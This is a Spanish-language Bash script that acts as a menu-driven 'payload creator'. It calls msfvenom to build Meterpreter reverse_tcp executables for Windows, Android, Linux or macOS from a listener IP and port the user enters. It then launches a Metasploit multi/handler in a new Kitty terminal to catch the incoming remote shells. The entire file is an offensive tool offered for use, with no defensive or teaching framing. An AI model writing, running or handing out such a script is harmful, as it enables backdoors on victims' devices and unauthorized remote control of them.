#!/bin/bash

# Función para mostrar el menú de opciones
show_menu() {
    echo "=============================="
    echo "    CREADOR DE PAYLOADS"
    echo "=============================="
    echo "Seleccione el tipo de dispositivo para el payload:"
    echo "1) Windows"
    echo "2) Android"
    echo "3) Linux"
    echo "4) MacOS"
    echo "5) Salir"
    echo "=============================="
}

# Función para el efecto de carga
loading_effect() {
    echo -n "Creando payload"
    for i in {1..10}; do
        echo -n "."
        sleep 0.3
    done
    echo ""
}

# Función para crear el payload según el tipo de dispositivo seleccionado
create_payload() {
    case $1 in
        1)
            echo "Has seleccionado Windows."
            PAYLOAD="windows/meterpreter/reverse_tcp"
            EXT="exe"
            ;;
        2)
            echo "Has seleccionado Android."
            PAYLOAD="android/meterpreter/reverse_tcp"
            EXT="apk"
            ;;
        3)
            echo "Has seleccionado Linux."
            PAYLOAD="linux/x86/meterpreter/reverse_tcp"
            EXT="elf"
            ;;
        4)
            echo "Has seleccionado MacOS."
            PAYLOAD="osx/x86_64/meterpreter_reverse_tcp"
            EXT="macho"
            ;;
        5)
            echo "Saliendo..."
            exit 0
            ;;
        *)
            echo "Opción no válida."
            exit 1
            ;;
    esac

    # Solicitar datos al usuario
    read -p "Ingrese la IP de escucha (LHOST): " LHOST
    read -p "Ingrese el puerto de escucha (LPORT): " LPORT
    read -p "Ingrese la ruta donde guardar el payload (sin la extensión): " OUTPUT_PATH

    # Mostrar el efecto de carga antes de crear el payload
    loading_effect

    # Crear el payload usando msfvenom
    msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -o "${OUTPUT_PATH}.${EXT}"
    if [ $? -eq 0 ]; then
        echo "Payload creado exitosamente en ${OUTPUT_PATH}.${EXT}"
    else
        echo "Error al crear el payload."
        exit 1
    fi
}

# Función para configurar Metasploit y escuchar en una nueva terminal
setup_metasploit() {
    echo "Configurando Metasploit para escuchar..."

    # Usar Kitty para abrir una nueva ventana y ejecutar Metasploit
    kitty bash -c "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; exploit'" &
}

# Menú de opciones
while true; do
    show_menu
    read -p "Seleccione una opción: " option
    create_payload $option
    setup_metasploit
    break
done
